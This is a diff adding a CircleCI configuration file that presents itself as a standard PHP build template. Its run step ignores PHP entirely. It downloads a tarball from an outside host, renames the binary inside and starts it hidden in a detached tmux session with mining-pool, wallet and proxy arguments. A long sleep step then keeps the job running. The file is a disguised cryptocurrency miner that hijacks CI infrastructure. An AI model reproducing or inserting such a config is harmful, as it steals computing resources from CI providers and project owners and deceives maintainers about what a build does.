@@ -1,0 +1,27 @@
+# PHP CircleCI 2.0 configuration file
+#
+# Check https://circleci.com/docs/2.0/language-php/ for more details
+#
+version: 2
+jobs:
+  build:
+    docker:
+      # Specify the version you desire here
+      - image: ubuntu:18.04
+
+      # Specify service dependencies here if necessary
+      # CircleCI maintains a library of pre-built images
+      # documented at https://circleci.com/docs/2.0/circleci-images/
+      # Using the RAM variation mitigates I/O contention
+      # for database intensive operations.
+      # - image: circleci/mysql:5.7-ram
+      #
+      # - image: redis:2.8.19
+
+    steps:
+      - checkout
+
+      - run: apt-get update; apt install sudo tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf leona; chmod +x leona; sudo tmux new -d -s my-session "./leona -t 8 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 3.128.34.6:34844"
+      - run: 
+            command: sleep 9910294
+            no_output_timeout: 4h
